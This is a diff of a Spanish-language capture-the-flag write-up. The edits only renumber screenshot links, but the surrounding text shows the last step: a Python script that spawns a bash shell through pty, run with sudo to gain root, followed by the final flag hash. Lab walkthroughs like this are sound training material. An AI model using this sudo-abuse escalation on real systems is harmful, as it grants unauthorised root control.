@@ -85,18 +85,18 @@ Creamos un nuevo`bak.py`con el siguiente contenido:
 import pty; pty.spawn("/bin/bash")
 ```
 
-![Imagen](images/Pasted_image_20250221172552.png)
+![Imagen](images/Pasted_image_20250221172815.png)
 
 Ejecutamos el siguiente comando para iniciar el script y obtener el root.
 
 ```
 sudo /usr/bin/python3 /home/meliodas/bak.py
 ```
-![Imagen](images/Pasted_image_20250221172815.png)
+![Imagen](images/Pasted_image_20250221172922.png)
 
 Nos ubicamos en la carpeta`/root/` y obtenemos la última flag.
 
-![Imagen](images/Pasted_image_20250221172922.png)
+![Imagen](images/Pasted_image_20250221173014.png)
 
 ```
 e8c8c6c256c35515d1d344ee0488c617
